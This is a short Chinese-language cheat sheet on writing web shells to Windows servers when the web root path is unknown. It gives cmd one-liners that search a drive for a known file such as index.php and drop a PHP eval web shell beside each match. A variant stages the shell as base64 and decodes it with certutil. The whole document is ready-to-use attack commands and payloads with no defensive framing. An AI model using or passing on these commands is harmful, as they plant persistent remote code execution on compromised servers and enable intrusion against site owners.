# windows 5he11

---

**无路径写shell**

- 来源：https://mp.weixin.qq.com/s/T4mLstr1OxI4RC3PzmtJag
- 原理：以一个已知文件来定点，循环查找根路径下存在已知文件的目录进行shell文件创建
- 普通写入

```
[规定查找的盘符] 例如: c盘, d盘, e盘, f盘
[查找的文件] 例如：index.php
[写入的内容] 例如：<?php eval($_REQUEST[1]); ?>
[写入的文件名字] 例如：xx.php

命令：for /f %i in ('dir /s /b [规定查找的盘符]:\[查找的文件]') do (echo "[写入的内容]" > %i\..\[写入的文件名字])    

命令实例化：for /f %i in ('dir /s /b c:\index.php') do (echo "<?php eval($_REQUEST[1]); ?>" > %i\..\xx.php)     
```

- base64写入

```
第一步
 先查找c盘上所有叫 1.jpg 的文件，然后把base64编码内容写入到 base64.txt 文件里面

[规定查找的盘符] 例如: c盘, d盘, e盘, f盘
[查找的文件] 例如：1.jpg
[写入的文件名字] 例如：1.php

命令：for /f %i in ('dir /s /b [规定查找的盘符]:\[查找的文件]') do (echo [base64编码的内容] > %i\..\[写入的文件名字])

实例执行命令：写base64文件到规定的路径下：for /f %i in ('dir /s /b c:\1.jpg') do (echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= > %i\..\base64.txt)  

第二步
 在找到第一步写入的文件，进行base64解码以后进行二次写马

[规定查找的盘符] 例如: c盘, d盘, e盘, f盘
[查找的文件] 例如：base64.txt
[要解码的文件名字] 例如：base64.txt
[写入的文件名字] 例如：1.php

命令：for /f %i in ('dir /s /b [规定查找的盘符]:\[查找的文件]') do (certutil.exe -decode %i\..\[要解码的文件名字] %i\..\[写入的文件名字])   

实例执行命令：for /f %i in ('dir /s /b c:\base64.txt') do (certutil.exe -decode %i\..\base64.txt %i\..\1.php)    

效果：
c盘所有叫 1.jpg 的文件同级目录就都会写入 1.php和base64.txt文件
```

  